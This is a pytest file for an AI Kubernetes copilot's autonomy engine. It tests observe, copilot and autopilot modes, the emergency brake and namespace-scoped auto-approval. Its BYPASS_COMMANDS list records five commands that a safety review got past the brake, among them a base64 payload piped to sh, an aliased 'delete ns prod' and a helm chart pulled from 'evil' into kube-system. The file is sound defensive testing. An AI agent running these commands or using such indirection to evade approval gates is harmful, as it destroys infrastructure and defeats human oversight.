"""Autonomy dial: observe / copilot / autopilot decision engine."""

from __future__ import annotations

import pytest

from kopilot.agent.safety import RiskLevel
from kopilot.executor.autonomy import (
    AutonomyDecision,
    AutonomyEngine,
    AutopilotGrant,
)


def _engine(level=1, grants=()):
    eng = AutonomyEngine(base_level=level)
    for g in grants:
        eng.set_grant(g)
    return eng


STAGING = AutopilotGrant(name="staging-autopilot", namespaces=["staging"])


# Verbatim from the 2026-08-22 safety review: each of these returned ALLOW
# with the emergency brake engaged.
BYPASS_COMMANDS = [
    "kubectl apply -f - -n kube-system",
    "helm upgrade oci://evil/chart -n kube-system",
    "echo <b64>|base64 -d|sh",
    "K=kubectl; $K delete ns prod",
    "echo a3ViZWN0bCBkZWxldGUgbnMgcHJvZAo=|base64 -d|sh",
]


class TestObserveMode:
    def test_level0_refuses_mutations(self):
        eng = _engine(level=0)
        d = eng.decide("kubectl delete pod x -n staging", "kubectl", RiskLevel.HIGH, True)
        assert d is AutonomyDecision.REFUSE

    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS)
    def test_level0_refuses_review_bypasses(self, cmd):
        """Observe mode keys off is_mutating, so a command that never asked
        for approval still stops at the brake."""
        eng = _engine(level=0)
        assert eng.decide(cmd, "kubectl", RiskLevel.LOW, False) is AutonomyDecision.REFUSE

    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS)
    def test_brake_refuses_review_bypasses(self, cmd):
        eng = _engine(level=1)
        eng.set_brake("emergency-stop")
        assert eng.decide(cmd, "kubectl", RiskLevel.LOW, False) is AutonomyDecision.REFUSE

    def test_negative_level_does_not_disable_observe(self, monkeypatch):
        """AUTONOMY_LEVEL=-1 used to clear observe mode entirely."""
        import pydantic

        from kopilot.config import Settings, reset_settings

        monkeypatch.setenv("AUTONOMY_LEVEL", "-1")
        reset_settings()
        with pytest.raises(pydantic.ValidationError):
            Settings()
        reset_settings()

    def test_level_above_two_is_rejected(self, monkeypatch):
        import pydantic

        from kopilot.config import Settings, reset_settings

        monkeypatch.setenv("AUTONOMY_LEVEL", "3")
        reset_settings()
        with pytest.raises(pydantic.ValidationError):
            Settings()
        reset_settings()

    def test_level0_allows_reads(self):
        eng = _engine(level=0)
        d = eng.decide("kubectl get pods -n staging", "kubectl", RiskLevel.LOW, False)
        assert d is AutonomyDecision.ALLOW

    def test_brake_policy_forces_observe(self):
        eng = _engine(level=1, grants=[STAGING])
        eng.set_brake("emergency-stop")
        d = eng.decide("kubectl delete pod x -n staging", "kubectl", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.REFUSE
        eng.clear_brake("emergency-stop")
        d = eng.decide("kubectl delete pod x -n staging", "kubectl", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.AUTO_APPROVE


class TestCopilotDefault:
    def test_gated_without_grants(self):
        eng = _engine(level=1)
        d = eng.decide("kubectl delete pod x -n staging", "kubectl", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.GATE

    def test_reads_allowed(self):
        eng = _engine(level=1)
        d = eng.decide("kubectl get pods -A", "kubectl", RiskLevel.LOW, False)
        assert d is AutonomyDecision.ALLOW


class TestAutopilotGrants:
    def test_grant_auto_approves_in_scope(self):
        eng = _engine(grants=[STAGING])
        d = eng.decide("kubectl delete pod x -n staging", "kubectl", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.AUTO_APPROVE
        granted = eng.granting_policy("kubectl delete pod x -n staging", RiskLevel.MEDIUM)
        assert granted == "staging-autopilot"

    def test_namespace_outside_grant_is_gated(self):
        eng = _engine(grants=[STAGING])
        d = eng.decide("kubectl delete pod x -n production", "kubectl", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.GATE

    def test_mixed_namespaces_one_outside_is_gated(self):
        eng = _engine(grants=[STAGING])
        cmd = "kubectl delete pod x -n staging --namespace=production"
        assert eng.decide(cmd, "kubectl", RiskLevel.MEDIUM, True) is AutonomyDecision.GATE

    def test_no_explicit_namespace_is_gated(self):
        eng = _engine(grants=[STAGING])
        d = eng.decide("kubectl delete pod x", "kubectl", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.GATE

    def test_all_namespaces_flag_is_gated(self):
        eng = _engine(grants=[STAGING])
        cmd = "kubectl delete pods --all -A"
        assert eng.decide(cmd, "kubectl", RiskLevel.MEDIUM, True) is AutonomyDecision.GATE

    def test_high_risk_destructive_is_auto_approved_in_scope(self):
        eng = _engine(grants=[STAGING])
        d = eng.decide("kubectl drain node1 -n staging", "kubectl", RiskLevel.HIGH, True)
        assert d is AutonomyDecision.AUTO_APPROVE

    def test_critical_never_auto_approved(self):
        eng = _engine(grants=[STAGING])
        d = eng.decide("kubectl delete ns staging -n staging", "kubectl", RiskLevel.CRITICAL, True)
        assert d is AutonomyDecision.GATE

    def test_opaque_payload_never_auto_approved(self):
        eng = _engine(grants=[STAGING])
        cmd = "kubectl exec -n staging web-0 -- rm -rf /var/data"
        assert eng.decide(cmd, "kubectl", RiskLevel.HIGH, True) is AutonomyDecision.GATE

    def test_shell_never_auto_approved(self):
        eng = _engine(grants=[STAGING])
        d = eng.decide("some-script -n staging", "shell", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.GATE

    def test_helm_in_scope_auto_approved(self):
        eng = _engine(grants=[STAGING])
        d = eng.decide("helm rollback myapp 3 -n staging", "helm", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.AUTO_APPROVE

    def test_remove_grant_restores_gating(self):
        eng = _engine(grants=[STAGING])
        eng.remove_grant("staging-autopilot")
        d = eng.decide("kubectl delete pod x -n staging", "kubectl", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.GATE


class TestEngineFromSettings:
    def test_env_configured_grant(self, monkeypatch):
        monkeypatch.setenv("AUTONOMY_LEVEL", "2")
        monkeypatch.setenv("AUTONOMY_AUTOPILOT_NAMESPACES", '["staging","qa"]')
        from kopilot.config import reset_settings

        reset_settings()
        from kopilot.executor.autonomy import build_engine_from_settings

        eng = build_engine_from_settings()
        d = eng.decide("kubectl delete pod x -n qa", "kubectl", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.AUTO_APPROVE
        reset_settings()

    def test_default_is_copilot(self):
        from kopilot.config import reset_settings

        reset_settings()
        from kopilot.executor.autonomy import build_engine_from_settings

        eng = build_engine_from_settings()
        d = eng.decide("kubectl delete pod x -n staging", "kubectl", RiskLevel.MEDIUM, True)
        assert d is AutonomyDecision.GATE


@pytest.mark.asyncio
class TestExecutorIntegration:
    async def test_auto_approved_executes_and_audits(self, mock_subprocess, autonomy_staging):
        from kopilot.executor.approvals import get_approval_store
        from kopilot.executor.middleware import run_kubectl

        result = await run_kubectl.ainvoke({"command": "kubectl delete pod x -n staging"})
        assert "mocked output" in result
        records = get_approval_store().list()
        auto = [r for r in records if r.decided_by.startswith("policy:")]
        assert len(auto) == 1
        assert auto[0].status.value == "consumed"

    async def test_out_of_scope_still_gated(self, mock_subprocess, autonomy_staging):
        from kopilot.executor.middleware import run_kubectl

        result = await run_kubectl.ainvoke({"command": "kubectl delete pod x -n production"})
        assert "APPROVAL REQUIRED" in result

    async def test_observe_mode_refuses(self, mock_subprocess, autonomy_observe):
        from kopilot.executor.middleware import run_kubectl

        result = await run_kubectl.ainvoke({"command": "kubectl delete pod x -n staging"})
        assert "OBSERVE MODE" in result
        assert "mocked output" not in result

    async def test_observe_mode_allows_reads(self, mock_subprocess, autonomy_observe):
        from kopilot.executor.middleware import run_kubectl

        result = await run_kubectl.ainvoke({"command": "kubectl get pods -n staging"})
        assert "mocked output" in result


@pytest.mark.asyncio
class TestReviewBypassesAtTheExecutor:
    """End-to-end proof for the five commands the safety review got through.

    Level 0 (emergency brake) must refuse them; level 1 must stop them and
    demand a human — outright for the two aimed at kube-system, via the
    approval queue for the three that hide behind shell indirection.
    """

    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS)
    async def test_refused_at_level_zero(self, cmd, mock_subprocess, autonomy_observe):
        from kopilot.executor.middleware import run_shell

        result = await run_shell.ainvoke({"command": cmd})
        assert "OBSERVE MODE" in result, result
        assert "mocked output" not in result

    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS)
    async def test_never_executes_at_level_one(self, cmd, mock_subprocess):
        from kopilot.executor.middleware import run_shell

        result = await run_shell.ainvoke({"command": cmd})
        assert "mocked output" not in result, result
        assert "APPROVAL REQUIRED" in result or "BLOCKED" in result, result

    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS[:2])
    async def test_protected_namespace_bypasses_blocked(self, cmd, mock_subprocess):
        from kopilot.executor.middleware import run_shell

        result = await run_shell.ainvoke({"command": cmd})
        assert "BLOCKED (critical)" in result, result

    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS[2:])
    async def test_shell_indirection_bypasses_need_approval(self, cmd, mock_subprocess):
        from kopilot.executor.approvals import get_approval_store
        from kopilot.executor.middleware import run_shell

        result = await run_shell.ainvoke({"command": cmd})
        assert "APPROVAL REQUIRED" in result, result
        assert any(r.status.value == "pending" for r in get_approval_store().list())
